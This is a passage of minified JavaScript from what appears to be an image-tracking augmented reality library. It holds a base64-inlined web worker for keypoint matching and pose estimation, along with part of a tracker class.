h7SDptW1JdLkgsc3JjUG9pbnQ6bltxXSxkc3RQb2ludDplW3FdLG9uZU92ZXJTY2FsZTI6bH0pO21bUl0uY29zdCs9SX1tLnNvcnQoKFIscSk9PlIuY29zdC1xLmNvc3QpLG0uc3BsaWNlKC1NYXRoLmZsb29yKChtLmxlbmd0aCsxKS8yKSl9bGV0IFQ9bnVsbDtmb3IobGV0IEU9MDtFPG0ubGVuZ3RoO0UrKyl7Y29uc3Qgaz1ZZSh7aW5IOm1bRV0uSH0pO2lmKE9lKHtIOmssdGVzdFBvaW50czpyLGtleWZyYW1lOnR9KSl7VD1rO2JyZWFrfX1yZXR1cm4gVH0sT2U9KHtIOm8sdGVzdFBvaW50czpuLGtleWZyYW1lOmV9KT0+e2NvbnN0IHQ9QnQobywxZS01KTtpZih0PT09bnVsbClyZXR1cm4hMTtjb25zdCBzPVtdO2ZvcihsZXQgaT0wO2k8bi5sZW5ndGg7aSsrKXMucHVzaChvdChuW2ldLHQpKTtyZXR1cm4hKERlKHNbMF0sc1sxXSxzWzJdLHNbM10pPGUud2lkdGgqZS5oZWlnaHQqMWUtNHx8IUJlKHNbMF0sc1sxXSxzWzJdLHNbM10pKX0sWWU9KHtpbkg6b30pPT57Y29uc3Qgbj0xL29bOF0sZT1bXTtmb3IobGV0IHQ9MDt0PDg7dCsrKWVbdF09b1t0XSpuO3JldHVybiBlWzhdPTEsZX0sQ2U9KHtIOm8sc3JjUG9pbnQ6bixkc3RQb2ludDplLG9uZU92ZXJTY2FsZTI6dH0pPT57Y29uc3Qgcz1vdChuLG8pLHI9W3NbMF0tZVswXSxzWzFdLWVbMV1dO3JldHVybiBNYXRoLmxvZygxKyhyWzBdKnJbMF0rclsxXSpyWzFdKSp0KX0sSGU9KHtIOm8sdGVzdFBvaW50czpufSk9Pntjb25zdCBlPVtdO2ZvcihsZXQgdD0wO3Q8bi5sZW5ndGg7dCsrKWVbdF09b3Qoblt0XSxvKTtmb3IobGV0IHQ9MDt0PG4ubGVuZ3RoO3QrKyl7Y29uc3Qgcz10LHI9KHQrMSklbi5sZW5ndGgsaT0odCsyKSVuLmxlbmd0aDtpZighRmUobltzXSxuW3JdLG5baV0sZVtzXSxlW3JdLGVbaV0pKXJldHVybiExfXJldHVybiEwfSwkdD0zLEx0PTYsS2U9OCxPdD0uNyxKZT0oe2tleWZyYW1lOm8scXVlcnlwb2ludHM6bixxdWVyeXdpZHRoOmUscXVlcnloZWlnaHQ6dCxkZWJ1Z01vZGU6c30pPT57bGV0IHI9e307Y29uc3QgaT1bXTtmb3IobGV0IG09MDttPG4ubGVuZ3RoO20rKyl7Y29uc3QgTT1uW21dLFQ9TS5tYXhpbWE/by5tYXhpbWFQb2ludHM6by5taW5pbWFQb2ludHM7aWYoVC5sZW5ndGg9PT0wKWNvbnRpbnVlO2NvbnN0IEU9TS5tYXhpbWE/by5tYXhpbWFQb2ludHNDbHVzdGVyLnJvb3ROb2RlOm8ubWluaW1hUG9pbnRzQ2x1c3Rlci5yb290Tm9kZSxrPVtdLFI9bmV3IFd0KFtdLChCLGMpPT5CLmQtYy5kKTtFdCh7bm9kZTpFLGtleXBvaW50czpULHF1ZXJ5cG9pbnQ6TSxxdWV1ZTpSLGtleXBvaW50SW5kZXhlczprLG51bVBvcDowfSk7bGV0IHE9LTEsST1OdW1iZXIuTUFYX1NBRkVfSU5URUdFUix6PU51bWJlci5NQVhfU0FGRV9JTlRFR0VSO2ZvcihsZXQgQj0wO0I8ay5sZW5ndGg7QisrKXtjb25zdCBjPVRba1tCXV0scD15dCh7djE6Yy5kZXNjcmlwdG9ycyx2MjpNLmRlc2NyaXB0b3JzfSk7cDxJPyh6PUksST1wLHE9a1tCXSk6cDx6JiYoej1wKX1xIT09LTEmJih6PT09TnVtYmVyLk1BWF9TQUZFX0lOVEVHRVJ8fDEqSS96PE90KSYmaS5wdXNoKHtxdWVyeXBvaW50Ok0sa2V5cG9pbnQ6VFtxXX0pfWlmKHMmJihyLm1hdGNoZXM9aSksaS5sZW5ndGg8THQpcmV0dXJue2RlYnVnRXh0cmE6cn07Y29uc3QgaD12dCh7a2V5d2lkdGg6by53aWR0aCxrZXloZWlnaHQ6by5oZWlnaHQscXVlcnl3aWR0aDplLHF1ZXJ5aGVpZ2h0OnQsbWF0Y2hlczppfSk7cyYmKHIuaG91Z2hNYXRjaGVzPWgpO2NvbnN0IGw9VXQoe3NyY1BvaW50czpoLm1hcChtPT5bbS5rZXlwb2ludC54LG0ua2V5cG9pbnQueV0pLGRzdFBvaW50czpoLm1hcChtPT5bbS5xdWVyeXBvaW50LngsbS5xdWVyeXBvaW50LnldKSxrZXlmcmFtZTpvfSk7aWYobD09PW51bGwpcmV0dXJue2RlYnVnRXh0cmE6cn07Y29uc3QgdT1ZdCh7SDpsLG1hdGNoZXM6aCx0aHJlc2hvbGQ6JHR9KTtpZihzJiYoci5pbmxpZXJNYXRjaGVzPXUpLHUubGVuZ3RoPEx0KXJldHVybntkZWJ1Z0V4dHJhOnJ9O2NvbnN0IGY9QnQobCwxZS01KSxnPTEwKjEwLGE9W107Zm9yKGxldCBtPTA7bTxuLmxlbmd0aDttKyspe2NvbnN0IE09blttXSxUPW90KFtNLngsTS55XSxmKTtsZXQgRT0tMSxrPU51bWJlci5NQVhfU0FGRV9JTlRFR0VSLFI9TnVtYmVyLk1BWF9TQUZFX0lOVEVHRVI7Y29uc3QgcT1NLm1heGltYT9vLm1heGltYVBvaW50czpvLm1pbmltYVBvaW50cztmb3IobGV0IEk9MDtJPHEubGVuZ3RoO0krKyl7Y29uc3Qgej1xW0ldO2lmKCh6LngtVFswXSkqKHoueC1UWzBdKSsoei55LVRbMV0pKih6LnktVFsxXSk+Zyljb250aW51ZTtjb25zdCBjPXl0KHt2MTp6LmRlc2NyaXB0b3JzLHYyOk0uZGVzY3JpcHRvcnN9KTtjPGs/KFI9ayxrPWMsRT1JKTpjPFImJihSPWMpfUUhPT0tMSYmKFI9PT1OdW1iZXIuTUFYX1NBRkVfSU5URUdFUnx8MSprL1I8T3QpJiZhLnB1c2goe3F1ZXJ5cG9pbnQ6TSxrZXlwb2ludDpxW0VdfSl9cyYmKHIubWF0Y2hlczI9YSk7Y29uc3Qgaj12dCh7a2V5d2lkdGg6by53aWR0aCxrZXloZWlnaHQ6by5oZWlnaHQscXVlcnl3aWR0aDplLHF1ZXJ5aGVpZ2h0OnQsbWF0Y2hlczphfSk7cyYmKHIuaG91Z2hNYXRjaGVzMj1qKTtjb25zdCB3PVV0KHtzcmNQb2ludHM6ai5tYXAobT0+W20ua2V5cG9pbnQueCxtLmtleXBvaW50LnldKSxkc3RQb2ludHM6ai5tYXAobT0+W20ucXVlcnlwb2ludC54LG0ucXVlcnlwb2ludC55XSksa2V5ZnJhbWU6b30pO2lmKHc9PT1udWxsKXJldHVybntkZWJ1Z0V4dHJhOnJ9O2NvbnN0IHk9WXQoe0g6dyxtYXRjaGVzOmosdGhyZXNob2xkOiR0fSk7cmV0dXJuIHMmJihyLmlubGllck1hdGNoZXMyPXkpLHtIOncsbWF0Y2hlczp5LGRlYnVnRXh0cmE6cn19LEV0PSh7bm9kZTpvLGtleXBvaW50czpuLHF1ZXJ5cG9pbnQ6ZSxxdWV1ZTp0LGtleXBvaW50SW5kZXhlczpzLG51bVBvcDpyfSk9PntpZihvLmxlYWYpe2ZvcihsZXQgbD0wO2w8by5wb2ludEluZGV4ZXMubGVuZ3RoO2wrKylzLnB1c2goby5wb2ludEluZGV4ZXNbbF0pO3JldHVybn1jb25zdCBpPVtdO2ZvcihsZXQgbD0wO2w8by5jaGlsZHJlbi5sZW5ndGg7bCsrKXtjb25zdCBmPW8uY2hpbGRyZW5bbF0uY2VudGVyUG9pbnRJbmRleCxnPXl0KHt2MTpuW2ZdLmRlc2NyaXB0b3JzLHYyOmUuZGVzY3JpcHRvcnN9KTtpLnB1c2goZyl9bGV0IGg9TnVtYmVyLk1BWF9TQUZFX0lOVEVHRVI7Zm9yKGxldCBsPTA7bDxvLmNoaWxkcmVuLmxlbmd0aDtsKyspaD1NYXRoLm1pbihoLGlbbF0pO2ZvcihsZXQgbD0wO2w8by5jaGlsZHJlbi5sZW5ndGg7bCsrKWlbbF0hPT1oJiZ0LnB1c2goe25vZGU6by5jaGlsZHJlbltsXSxkOmlbbF19KTtmb3IobGV0IGw9MDtsPG8uY2hpbGRyZW4ubGVuZ3RoO2wrKylpW2xdPT09aCYmRXQoe25vZGU6by5jaGlsZHJlbltsXSxrZXlwb2ludHM6bixxdWVyeXBvaW50OmUscXVldWU6dCxrZXlwb2ludEluZGV4ZXM6cyxudW1Qb3A6cn0pO2lmKHI8S2UmJnQubGVuZ3RoPjApe2NvbnN0e25vZGU6bCxkOnV9PXQucG9wKCk7cis9MSxFdCh7bm9kZTpsLGtleXBvaW50czpuLHF1ZXJ5cG9pbnQ6ZSxxdWV1ZTp0LGtleXBvaW50SW5kZXhlczpzLG51bVBvcDpyfSl9fSxZdD1vPT57Y29uc3R7SDpuLG1hdGNoZXM6ZSx0aHJlc2hvbGQ6dH09byxzPXQqdCxyPVtdO2ZvcihsZXQgaT0wO2k8ZS5sZW5ndGg7aSsrKXtjb25zdCBoPWVbaV0ucXVlcnlwb2ludCxsPWVbaV0ua2V5cG9pbnQsdT1vdChbbC54LGwueV0sbik7KHVbMF0taC54KSoodVswXS1oLngpKyh1WzFdLWgueSkqKHVbMV0taC55KTw9cyYmci5wdXNoKGVbaV0pfXJldHVybiByfTtjbGFzcyBHZXtjb25zdHJ1Y3RvcihuLGUsdD0hMSl7dGhpcy5xdWVyeVdpZHRoPW4sdGhpcy5xdWVyeUhlaWdodD1lLHRoaXMuZGVidWdNb2RlPXR9bWF0Y2hEZXRlY3Rpb24obixlKXtsZXQgdD17ZnJhbWVzOltdfSxzPW51bGw7Zm9yKGxldCBsPTA7bDxuLmxlbmd0aDtsKyspe2NvbnN0e0g6dSxtYXRjaGVzOmYsZGVidWdFeHRyYTpnfT1KZSh7a2V5ZnJhbWU6bltsXSxxdWVyeXBvaW50czplLHF1ZXJ5d2lkdGg6dGhpcy5xdWVyeVdpZHRoLHF1ZXJ5aGVpZ2h0OnRoaXMucXVlcnlIZWlnaHQsZGVidWdNb2RlOnRoaXMuZGVidWdNb2RlfSk7dC5mcmFtZXMucHVzaChnKSx1JiYocz09PW51bGx8fHMubWF0Y2hlcy5sZW5ndGg8Zi5sZW5ndGgpJiYocz17a2V5ZnJhbWVJbmRleDpsLEg6dSxtYXRjaGVzOmZ9KX1pZihzPT09bnVsbClyZXR1cm57a2V5ZnJhbWVJbmRleDotMSxkZWJ1Z0V4dHJhOnR9O2NvbnN0IHI9W10saT1bXSxoPW5bcy5rZXlmcmFtZUluZGV4XTtmb3IobGV0IGw9MDtsPHMubWF0Y2hlcy5sZW5ndGg7bCsrKXtjb25zdCB1PXMubWF0Y2hlc1tsXS5xdWVyeXBvaW50LGY9cy5tYXRjaGVzW2xdLmtleXBvaW50O3IucHVzaCh7eDp1LngseTp1Lnl9KSxpLnB1c2goe3g6KGYueCsuNSkvaC5zY2FsZSx5OihmLnkrLjUpL2guc2NhbGUsejowfSl9cmV0dXJue3NjcmVlbkNvb3JkczpyLHdvcmxkQ29vcmRzOmksa2V5ZnJhbWVJbmRleDpzLmtleWZyYW1lSW5kZXgsZGVidWdFeHRyYTp0fX19Y29uc3QgV2U9KHtzY3JlZW5Db29yZHM6byx3b3JsZENvb3JkczpuLHByb2plY3Rpb25UcmFuc2Zvcm06ZX0pPT57Y29uc3QgdD1WdChuLm1hcChtPT5bbS54LG0ueV0pLG8ubWFwKG09PlttLngsbS55XSkpLHM9bmV3IGIoW1t0WzBdLHRbMV0sdFsyXV0sW3RbM10sdFs0XSx0WzVdXSxbdFs2XSx0WzddLHRbOF1dXSkscj1uZXcgYihlKSxsPU10KHIpLm1tdWwocykudG8xREFycmF5KCksdT1NYXRoLnNxcnQobFswXSpsWzBdK2xbM10qbFszXStsWzZdKmxbNl0pLGY9TWF0aC5zcXJ0KGxbMV0qbFsxXStsWzRdKmxbNF0rbFs3XSpsWzddKSxnPSh1K2YpLzIsYT1bXTthWzBdPWxbMF0vdSxhWzNdPWxbM10vdSxhWzZdPWxbNl0vdSxhWzFdPWxbMV0vZixhWzRdPWxbNF0vZixhWzddPWxbN10vZixhWzJdPWFbM10qYVs3XS1hWzZdKmFbNF0sYVs1XT1hWzZdKmFbMV0tYVswXSphWzddLGFbOF09YVswXSphWzRdLWFbMV0qYVszXTtjb25zdCBqPU1hdGguc3FydChhWzJdKmFbMl0rYVs1XSphWzVdK2FbOF0qYVs4XSk7YVsyXS89aixhWzVdLz1qLGFbOF0vPWo7Y29uc3Qgdz1bXTtyZXR1cm4gd1swXT1sWzJdL2csd1sxXT1sWzVdL2csd1syXT1sWzhdL2csW1thWzBdLGFbMV0sYVsyXSx3WzBdXSxbYVszXSxhWzRdLGFbNV0sd1sxXV0sW2FbNl0sYVs3XSxhWzhdLHdbMl1dXX0sUWU9KG8sbik9Pltbb1swXVswXSpuWzBdWzBdK29bMF1bMl0qblsyXVswXSxvWzBdWzBdKm5bMF1bMV0rb1swXVsyXSpuWzJdWzFdLG9bMF1bMF0qblswXVsyXStvWzBdWzJdKm5bMl1bMl0sb1swXVswXSpuWzBdWzNdK29bMF1bMl0qblsyXVszXV0sW29bMV1bMV0qblsxXVswXStvWzFdWzJdKm5bMl1bMF0sb1sxXVsxXSpuWzFdWzFdK29bMV1bMl0qblsyXVsxXSxvWzFdWzFdKm5bMV1bMl0rb1sxXVsyXSpuWzJdWzJdLG9bMV1bMV0qblsxXVszXStvWzFdWzJdKm5bMl1bM11dLFtuWzJdWzBdLG5bMl1bMV0sblsyXVsyXSxuWzJdWzNdXV0sQ3Q9KG8sbixlLHQpPT57Y29uc3Qgcz1vWzBdWzBdKm4rb1swXVsxXSplK29bMF1bM10scj1vWzFdWzBdKm4rb1sxXVsxXSplK29bMV1bM10saT1vWzJdWzBdKm4rb1syXVsxXSplK29bMl1bM107cmV0dXJue3g6cyx5OnIsejppfX0sWmU9KG8sbixlLHQpPT57Y29uc3R7eDpzLHk6cix6Oml9PUN0KG8sbixlKTtyZXR1cm57eDpzL2kseTpyL2l9fSx4ZT01LEFlPTQsSHQ9MTAsdG49LjEsZW49Ljk5O2xldCBIPVtbXSxbXSxbXV0sQT1bW10sW11dLE89W1tdLFtdLFtdXTtjb25zdCBubj0oe2luaXRpYWxNb2RlbFZpZXdUcmFuc2Zvcm06byxwcm9qZWN0aW9uVHJhbnNmb3JtOm4sd29ybGRDb29yZHM6ZSxzY3JlZW5Db29yZHM6dH0pPT57bGV0IHM9MCxyPTA7Zm9yKGxldCBnPTA7ZzxlLmxlbmd0aDtnKyspcys9ZVtnXS54LHIrPWVbZ10ueTtzLz1lLmxlbmd0aCxyLz1lLmxlbmd0aDtjb25zdCBpPVtdO2ZvcihsZXQgZz0wO2c8ZS5sZW5ndGg7ZysrKWkucHVzaCh7eDplW2ddLngtcyx5OmVbZ10ueS1yLHo6ZVtnXS56fSk7Y29uc3QgaD1bW10sW10sW11dO2ZvcihsZXQgZz0wO2c8MztnKyspZm9yKGxldCBhPTA7YTwzO2ErKyloW2ddW2FdPW9bZ11bYV07aFswXVszXT1vWzBdWzBdKnMrb1swXVsxXSpyK29bMF1bM10saFsxXVszXT1vWzFdWzBdKnMrb1sxXVsxXSpyK29bMV1bM10saFsyXVszXT1vWzJdWzBdKnMrb1syXVsxXSpyK29bMl1bM107Y29uc3QgbD1bMSwuOCwuNiwuNCwwXTtsZXQgdT1oLGY9bnVsbDtmb3IobGV0IGc9MDtnPGwubGVuZ3RoO2crKyl7Y29uc3QgYT1zbih7aW5pdGlhbE1vZGVsVmlld1RyYW5zZm9ybTp1LHByb2plY3Rpb25UcmFuc2Zvcm06bix3b3JsZENvb3JkczppLHNjcmVlbkNvb3Jkczp0LGlubGllclByb2I6bFtnXX0pO2lmKHU9YS5tb2RlbFZpZXdUcmFuc2Zvcm0sYS5lcnI8eGUpe2Y9dTticmVha319cmV0dXJuIGY9PT1udWxsP251bGw6KGZbMF1bM109ZlswXVszXS1mWzBdWzBdKnMtZlswXVsxXSpyLGZbMV1bM109ZlsxXVszXS1mWzFdWzBdKnMtZlsxXVsxXSpyLGZbMl1bM109ZlsyXVszXS1mWzJdWzBdKnMtZlsyXVsxXSpyLGYpfSxzbj0oe2luaXRpYWxNb2RlbFZpZXdUcmFuc2Zvcm06byxwcm9qZWN0aW9uVHJhbnNmb3JtOm4sd29ybGRDb29yZHM6ZSxzY3JlZW5Db29yZHM6dCxpbmxpZXJQcm9iOnN9KT0+e2NvbnN0IHI9czwxO2xldCBpPW8saD0wLGw9MCx1PW5ldyBBcnJheShlLmxlbmd0aCksZj1uZXcgQXJyYXkoZS5sZW5ndGgpLGc9bmV3IEFycmF5KGUubGVuZ3RoKSxhPW5ldyBBcnJheShlLmxlbmd0aCk7Zm9yKGxldCBqPTA7ajw9SHQ7aisrKXtjb25zdCB3PVFlKG4saSk7Zm9yKGxldCBFPTA7RTxlLmxlbmd0aDtFKyspe2NvbnN0IGs9WmUodyxlW0VdLngsZVtFXS55LGVbRV0ueiksUj10W0VdLngtay54LHE9dFtFXS55LWsueTtnW0VdPVIsYVtFXT1xLHVbRV09UipSK3EqcX1sZXQgeTtpZihsPTAscil7Y29uc3QgRT1NYXRoLm1heCgzLE1hdGguZmxvb3IoZS5sZW5ndGgqcyktMSk7Zm9yKGxldCBrPTA7azxlLmxlbmd0aDtrKyspZltrXT11W2tdO2Yuc29ydCgoayxSKT0+ay1SKSx5PU1hdGgubWF4KGZbRV0qQWUsMTYpO2ZvcihsZXQgaz0wO2s8ZS5sZW5ndGg7aysrKWZba10+eT9sKz15LzY6bCs9eS82KigxLSgxLWZba10veSkqKDEtZltrXS95KSooMS1mW2tdL3kpKX1lbHNlIGZvcihsZXQgRT0wO0U8ZS5sZW5ndGg7RSsrKWwrPXVbRV07aWYobC89ZS5sZW5ndGgsbDx0bnx8aj4wJiZsL2g+ZW58fGo9PT1IdClicmVhaztoPWw7Y29uc3QgbT1bXSxNPVtdO2ZvcihsZXQgRT0wO0U8ZS5sZW5ndGg7RSsrKXtpZihyJiZ1W0VdPnkpY29udGludWU7Y29uc3Qgaz1sbih7bW9kZWxWaWV3UHJvamVjdGlvblRyYW5zZm9ybTp3LG1vZGVsVmlld1RyYW5zZm9ybTppLHByb2plY3Rpb25UcmFuc2Zvcm06bix3b3JsZENvb3JkOmVbRV19KTtpZihyKXtjb25zdCBSPSgxLXVbRV0veSkqKDEtdVtFXS95KTtmb3IobGV0IHE9MDtxPDI7cSsrKWZvcihsZXQgST0wO0k8NjtJKyspa1txXVtJXSo9UjttLnB1c2goW2dbRV0qUl0pLG0ucHVzaChbYVtFXSpSXSl9ZWxzZSBtLnB1c2goW2dbRV1dKSxtLnB1c2goW2FbRV1dKTtmb3IobGV0IFI9MDtSPGsubGVuZ3RoO1IrKylNLnB1c2goa1tSXSl9Y29uc3QgVD1ybih7ZFU6bSxKX1VfUzpNfSk7aWYoVD09PW51bGwpYnJlYWs7aT1vbih7bW9kZWxWaWV3VHJhbnNmb3JtOmksZFM6VH0pfXJldHVybnttb2RlbFZpZXdUcmFuc2Zvcm06aSxlcnI6bH19LG9uPSh7bW9kZWxWaWV3VHJhbnNmb3JtOm8sZFM6bn0pPT57bGV0IGU9blswXSpuWzBdK25bMV0qblsxXStuWzJdKm5bMl0sdCxzLHI7ZTwxZS02Pyh0PTEscz0wLHI9MCxlPTApOihlPU1hdGguc3FydChlKSx0PW5bMF0vZSxzPW5bMV0vZSxyPW5bMl0vZSk7Y29uc3QgaT1NYXRoLmNvcyhlKSxoPU1hdGguc2luKGUpLGw9MS1pO0hbMF1bMF09dCp0KmwraSxIWzBdWzFdPXQqcypsLXIqaCxIWzBdWzJdPXQqcipsK3MqaCxIWzBdWzNdPW5bM10sSFsxXVswXT1zKnQqbCtyKmgsSFsxXVsxXT1zKnMqbCtpLEhbMV1bMl09cypyKmwtdCpoLEhbMV1bM109bls0XSxIWzJdWzBdPXIqdCpsLXMqaCxIWzJdWzFdPXIqcypsK3QqaCxIWzJdWzJdPXIqcipsK2ksSFsyXVszXT1uWzVdO2NvbnN0IHU9W1tdLFtdLFtdXTtmb3IobGV0IGY9MDtmPDM7ZisrKXtmb3IobGV0IGc9MDtnPDQ7ZysrKXVbZl1bZ109b1tmXVswXSpIWzBdW2ddK29bZl1bMV0qSFsxXVtnXStvW2ZdWzJdKkhbMl1bZ107dVtmXVszXSs9b1tmXVszXX1yZXR1cm4gdX0scm49KHtkVTpvLEpfVV9TOm59KT0+e2NvbnN0IGU9bmV3IGIobiksdD1uZXcgYihvKSxzPWUudHJhbnNwb3NlKCkscj1zLm1tdWwoZSksaT1zLm1tdWwodCk7bGV0IGg7dHJ5e2g9TXQocil9Y2F0Y2h7cmV0dXJuIG51bGx9cmV0dXJuIGgubW11bChpKS50bzFEQXJyYXkoKX0sbG49KHttb2RlbFZpZXdQcm9qZWN0aW9uVHJhbnNmb3JtOm8sbW9kZWxWaWV3VHJhbnNmb3JtOm4scHJvamVjdGlvblRyYW5zZm9ybTplLHdvcmxkQ29vcmQ6dH0pPT57Y29uc3Qgcz1uLHt4OnIseTppLHo6aH09dCxsPUN0KG8scixpKSx1PWwueipsLno7QVswXVswXT1lWzBdWzBdKmwuei91LEFbMF1bMV09ZVswXVsxXSpsLnovdSxBWzBdWzJdPShlWzBdWzJdKmwuei1lWzJdWzJdKmwueCkvdSxBWzFdWzBdPWVbMV1bMF0qbC56L3UsQVsxXVsxXT1lWzFdWzFdKmwuei91LEFbMV1bMl09KGVbMV1bMl0qbC56LWVbMl1bMl0qbC55KS91LE9bMF1bMF09c1swXVsyXSppLE9bMF1bMV09LXNbMF1bMl0qcixPWzBdWzJdPXNbMF1bMV0qci1zWzBdWzBdKmksT1swXVszXT1zWzBdWzBdLE9bMF1bNF09c1swXVsxXSxPWzBdWzVdPXNbMF1bMl0sT1sxXVswXT1zWzFdWzJdKmksT1sxXVsxXT0tc1sxXVsyXSpyLE9bMV1bMl09c1sxXVsxXSpyLXNbMV1bMF0qaSxPWzFdWzNdPXNbMV1bMF0sT1sxXVs0XT1zWzFdWzFdLE9bMV1bNV09c1sxXVsyXSxPWzJdWzBdPXNbMl1bMl0qaSxPWzJdWzFdPS1zWzJdWzJdKnIsT1syXVsyXT1zWzJdWzFdKnItc1syXVswXSppLE9bMl1bM109c1syXVswXSxPWzJdWzRdPXNbMl1bMV0sT1syXVs1XT1zWzJdWzJdO2NvbnN0IGY9W1tdLFtdXTtmb3IobGV0IGc9MDtnPDI7ZysrKWZvcihsZXQgYT0wO2E8NjthKyspe2ZbZ11bYV09MDtmb3IobGV0IGo9MDtqPDM7aisrKWZbZ11bYV0rPUFbZ11bal0qT1tqXVthXX1yZXR1cm4gZn07Y2xhc3MgaG57Y29uc3RydWN0b3Iobil7dGhpcy5wcm9qZWN0aW9uVHJhbnNmb3JtPW59ZXN0aW1hdGUoe3NjcmVlbkNvb3JkczpuLHdvcmxkQ29vcmRzOmV9KXtyZXR1cm4gV2Uoe3NjcmVlbkNvb3JkczpuLHdvcmxkQ29vcmRzOmUscHJvamVjdGlvblRyYW5zZm9ybTp0aGlzLnByb2plY3Rpb25UcmFuc2Zvcm19KX1yZWZpbmVFc3RpbWF0ZSh7aW5pdGlhbE1vZGVsVmlld1RyYW5zZm9ybTpuLHdvcmxkQ29vcmRzOmUsc2NyZWVuQ29vcmRzOnR9KXtyZXR1cm4gbm4oe2luaXRpYWxNb2RlbFZpZXdUcmFuc2Zvcm06bix3b3JsZENvb3JkczplLHNjcmVlbkNvb3Jkczp0LHByb2plY3Rpb25UcmFuc2Zvcm06dGhpcy5wcm9qZWN0aW9uVHJhbnNmb3JtfSl9fWxldCBLdD1udWxsLEp0PSExLEd0PW51bGwsU3Q9bnVsbDtvbm1lc3NhZ2U9bz0+e2NvbnN0e2RhdGE6bn09bztzd2l0Y2gobi50eXBlKXtjYXNlInNldHVwIjpuLnByb2plY3Rpb25UcmFuc2Zvcm0sS3Q9bi5tYXRjaGluZ0RhdGFMaXN0LEp0PW4uZGVidWdNb2RlLEd0PW5ldyBHZShuLmlucHV0V2lkdGgsbi5pbnB1dEhlaWdodCxKdCksU3Q9bmV3IGhuKG4ucHJvamVjdGlvblRyYW5zZm9ybSk7YnJlYWs7Y2FzZSJtYXRjaCI6Y29uc3QgZT1uLnRhcmdldEluZGV4ZXM7bGV0IHQ9LTEscz1udWxsLHI9bnVsbDtmb3IobGV0IGY9MDtmPGUubGVuZ3RoO2YrKyl7Y29uc3QgZz1lW2ZdLHtrZXlmcmFtZUluZGV4OmEsc2NyZWVuQ29vcmRzOmosd29ybGRDb29yZHM6dyxkZWJ1Z0V4dHJhOnl9PUd0Lm1hdGNoRGV0ZWN0aW9uKEt0W2ddLG4uZmVhdHVyZVBvaW50cyk7aWYocj15LGEhPT0tMSl7Y29uc3QgbT1TdC5lc3RpbWF0ZSh7c2NyZWVuQ29vcmRzOmosd29ybGRDb29yZHM6d30pO20mJih0PWcscz1tKTticmVha319cG9zdE1lc3NhZ2Uoe3R5cGU6Im1hdGNoRG9uZSIsdGFyZ2V0SW5kZXg6dCxtb2RlbFZpZXdUcmFuc2Zvcm06cyxkZWJ1Z0V4dHJhOnJ9KTticmVhaztjYXNlInRyYWNrVXBkYXRlIjpjb25zdHttb2RlbFZpZXdUcmFuc2Zvcm06aSx3b3JsZENvb3JkczpoLHNjcmVlbkNvb3JkczpsfT1uLHU9U3QucmVmaW5lRXN0aW1hdGUoe2luaXRpYWxNb2RlbFZpZXdUcmFuc2Zvcm06aSx3b3JsZENvb3JkczpoLHNjcmVlbkNvb3JkczpsfSk7cG9zdE1lc3NhZ2Uoe3R5cGU6InRyYWNrVXBkYXRlRG9uZSIsbW9kZWxWaWV3VHJhbnNmb3JtOnV9KTticmVhaztjYXNlImRpc3Bvc2UiOmNsb3NlKCk7YnJlYWs7ZGVmYXVsdDp0aHJvdyBuZXcgRXJyb3IoYEludmFsaWQgbWVzc2FnZSB0eXBlICcke24udHlwZX0nYCl9fX0pKCk7Cg=="
      , kI = typeof window < "u" && window.Blob && new Blob([atob(SI)],{
        type: "text/javascript;charset=utf-8"
    });
    function JH(n) {
        let t;
        try {
            if (t = kI && (window.URL || window.webkitURL).createObjectURL(kI),
            !t)
                throw "";
            const e = new Worker(t,{
                name: null == n ? void 0 : n.name
            });
            return e.addEventListener("error", (()=>{
                (window.URL || window.webkitURL).revokeObjectURL(t)
            }
            )),
            e
        } catch {
            return new Worker("data:application/javascript;base64," + SI,{
                name: null == n ? void 0 : n.name
            })
        } finally {
            t && (window.URL || window.webkitURL).revokeObjectURL(t)
        }
    }
    const t9 = (n,t,e,s)=>{
        const {x: o, y: r, z: i} = ((n,t,e,s)=>({
            x: n[0][0] * t + n[0][1] * e + n[0][3],
            y: n[1][0] * t + n[1][1] * e + n[1][3],
            z: n[2][0] * t + n[2][1] * e + n[2][3]
        }))(n, t, e);
        return {
            x: o / i,
            y: r / i
        }
    }
      , qn = 1e3;
    class a9 {
        constructor(t, e, s, o, r, i=!1) {
            this.markerDimensions = t,
            this.trackingDataList = e,
            this.projectionTransform = s,
            this.debugMode = i,
            this.trackingKeyframeList = [];
            for (let c = 0; c < e.length; c++)
                this.trackingKeyframeList.push(e[c][1]);
            let a = 0;
            for (let c = 0; c < this.trackingKeyframeList.length; c++)
                a = Math.max(a, this.trackingKeyframeList[c].points.length);
            this.featurePointsListT = [],
            this.imagePixelsListT = [],
            this.imagePropertiesListT = [];
            for (let c = 0; c < this.trackingKeyframeList.length; c++) {
                const {featurePoints: l, imagePixels: u, imageProperties: d} = this._prebuild(this.trackingKeyframeList[c], a);
                this.featurePointsListT[c] = l,
                this.imagePixelsListT[c] = u,
                this.imagePropertiesListT[c] = d
            }
            this.kernelCaches = {}
        }
        dummyRun(t) {
            let e = [[1, 1, 1, 1], [1, 1, 1, 1], [1, 1, 1, 1]];
            for (let s = 0; s < this.featurePointsListT.length; s++)
                this.track(t, e, s)
        }
        track(t, e, s) {
            let o = {};
            const r = ((n,t)=>[[n[0][0] * t[0][0] + n[0][2] * t[2][0], n[0][0] * t[0][1] + n[0][2] * t[2][1], n[0][0] * t[0][2] + n[0][2] * t[2][2], n[0][0] * t[0][3] + n[0][2] * t[2][3]], [n[1][1] * t[1][0] + n[1][2] * t[2][0], n[1][1] * t[1][1] + n[1][2] * t[2][1], n[1][1] * t[1][2] + n[1][2] * t[2][2], n[1][1] * t[1][3] + n[1][2] * t[2][3]], [t[2][0], t[2][1], t[2][2], t[2][3]]])(this.projectionTransform, e)
              , i = this._buildAdjustedModelViewTransform(r);
            this.markerDimensions[s][0],
            this.markerDimensions[s][1],
            this.trackingKeyframeList[s].width,
            this.trackingKeyframeList[s].height;
            const a = this.featurePointsListT[s]
              , c = this.imagePixelsListT[s]
              , l = this.imagePropertiesListT[s]
              , u = this._computeProjection(i, t, s)
              , {matchingPointsT: d, simT: h} = this._computeMatching(a, c, l, u)
              , p = d.arraySync()
              , f = h.arraySync()
              , m = this.trackingKeyframeList[s]
              , g = []
              , b = []
              , x = [];
            for (let I = 0; I < p.length; I++)
                if (f[I] > .8 && I < m.points.length) {
                    x.push(I);
                    const y = t9(r, p[I][0], p[I][1]);
                    b.push(y),
                    g.push({
                        x: m.points[I].x / m.scale,
                        y: m.points[I].y / m.scale,
                        z: 0
                    })
                }
            return this.debugMode && (o = {
                projectedImage: u.arraySync(),
                matchingPoints: d.arraySync(),
                goodTrack: x,
                trackedPoints: b
            }),
            i.dispose(),
            u.dispose(),
            d.dispose(),
            h.dispose(),
            {
